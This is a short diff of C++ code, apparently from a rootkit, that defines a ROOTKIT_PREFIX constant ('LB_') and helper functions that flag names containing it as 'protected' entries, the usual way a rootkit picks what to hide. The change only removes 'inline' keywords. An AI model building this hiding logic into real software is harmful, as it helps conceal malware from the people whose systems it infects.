@@ -4,14 +4,14 @@
 
 constexpr static auto ROOTKIT_PREFIX = L"LB_";
 
-inline bool is_protected_entry(const wchar_t* str, std::size_t len) noexcept
+bool is_protected_entry(const wchar_t* str, std::size_t len) noexcept
 {
 	const std::wstring_view sv(str, len);
 	
 	return sv.find(ROOTKIT_PREFIX) != std::wstring_view::npos;
 }
 
-inline bool is_protected_entry(const UNICODE_STRING& uni_str) noexcept
+bool is_protected_entry(const UNICODE_STRING& uni_str) noexcept
 {
 	return is_protected_entry(uni_str.Buffer, uni_str.Length / sizeof(wchar_t));
 }
